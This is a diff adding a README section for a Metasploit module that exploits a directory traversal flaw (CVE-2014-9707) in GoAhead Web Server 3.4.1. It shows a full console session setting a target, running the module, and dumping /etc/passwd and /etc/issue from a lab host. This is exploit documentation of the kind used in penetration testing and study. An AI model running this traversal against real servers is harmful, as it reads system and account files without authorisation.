@@ -186,6 +186,93 @@ msf auxiliary(rips_traversal) >
 ```
 
 ---
+### goahead_traversal.rb
+Module to read file via directory traversal in GoAhead Web Server.
+
+Output:
+```
+msf > use auxiliary/scanner/http/goahead_traversal 
+msf auxiliary(goahead_traversal) > show options 
+
+Module options (auxiliary/scanner/http/goahead_traversal):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DEPTH     5                yes       Traversal Depth (to reach the root folder)
+   FILEPATH  /etc/passwd      yes       The path to the file to read
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     80               yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   VHOST                      no        HTTP server virtual host
+
+msf auxiliary(goahead_traversal) > info
+
+       Name: GoAhead Embedded Web Server Directory Traversal
+     Module: auxiliary/scanner/http/goahead_traversal
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  Matthew Daley
+  Roberto Soares Espreto <robertoespreto@gmail.com>
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  DEPTH     5                yes       Traversal Depth (to reach the root folder)
+  FILEPATH  /etc/passwd      yes       The path to the file to read
+  Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                     yes       The target address range or CIDR identifier
+  RPORT     80               yes       The target port
+  THREADS   1                yes       The number of concurrent threads
+  VHOST                      no        HTTP server virtual host
+
+Description:
+  This module exploits a directory traversal vulnerability in the 
+  EmbedThis GoAhead Web Server v3.4.1, allowing to read arbitrary 
+  files with the web server privileges.
+
+References:
+  http://cvedetails.com/cve/2014-9707/
+  http://packetstormsecurity.com/files/131156/GoAhead-3.4.1-Heap-Overflow-Traversal.html
+
+msf auxiliary(goahead_traversal) > set RHOSTS 192.168.1.46
+RHOSTS => 192.168.1.46
+msf auxiliary(goahead_traversal) > run
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+...snip...
+saned:x:114:123::/home/saned:/bin/false
+espreto:x:1000:1000:espreto,,,:/home/espreto:/bin/bash
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+postgres:x:115:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:116:126:MySQL Server,,,:/nonexistent:/bin/false
+
+[+] 192.168.1.46:80 - File saved in: /home/espreto/.msf4/loot/20150407194735_default_192.168.1.46_goahead.traversa_206479.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(goahead_traversal) > set FILEPATH /etc/issue
+FILEPATH => /etc/issue
+msf auxiliary(goahead_traversal) > run
+
+Ubuntu 12.04.5 LTS \n \l
+
+
+[+] 192.168.1.46:80 - File saved in: /home/espreto/.msf4/loot/20150407194743_default_192.168.1.46_goahead.traversa_164437.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(goahead_traversal) >
+```
+
+---
 ### enum_system.rb
 Find for SUIDs and SGIDs in linux systems.
 
